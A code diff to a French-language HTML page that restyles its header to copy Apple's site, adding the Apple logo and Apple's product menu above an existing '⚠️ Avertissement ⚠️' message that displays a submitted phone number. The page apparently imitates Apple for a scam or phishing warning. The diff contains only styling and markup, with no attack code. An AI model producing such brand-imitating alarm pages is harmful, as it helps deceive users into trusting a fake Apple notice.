@@ -11,24 +11,46 @@
       background-color: #121212;
       color: #f5f5f7;
     }
+
+    /* Header stylé comme celui d'Apple */
     header {
       background-color: #1c1c1e;
-      padding: 10px 20px;
+      padding: 0 20px;
       display: flex;
       align-items: center;
       justify-content: space-between;
       border-bottom: 1px solid #3a3a3c;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      height: 48px;
+    }
+    header nav {
+      display: flex;
+      align-items: center;
     }
     header nav a {
       color: #f5f5f7;
       text-decoration: none;
       margin: 0 15px;
+      font-size: 14px;
+      font-weight: 400;
+      transition: color 0.3s;
     }
+    header nav a:hover {
+      color: #0071e3;
+    }
+    header img {
+      height: 20px;
+    }
+
+    /* Style principal */
     main {
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      padding: 20px;
       height: 80vh;
     }
     .warning {
@@ -46,17 +68,32 @@
       max-width: 400px;
       text-align: center;
     }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      header nav a {
+        margin: 0 10px;
+      }
+    }
   </style>
 </head>
 <body>
   <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" height="25">
+    <!-- Logo Apple -->
+    <a href="#">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
+    </a>
     <nav>
-      <a href="#">Produits</a>
+      <a href="#">Store</a>
+      <a href="#">Mac</a>
+      <a href="#">iPad</a>
+      <a href="#">iPhone</a>
+      <a href="#">Watch</a>
+      <a href="#">AirPods</a>
       <a href="#">Assistance</a>
-      <a href="#">Contact</a>
     </nav>
   </header>
+
   <main>
     <h1>⚠️ Avertissement ⚠️</h1>
     <p class="warning">Numéro saisi : <span id="phone"></span></p>
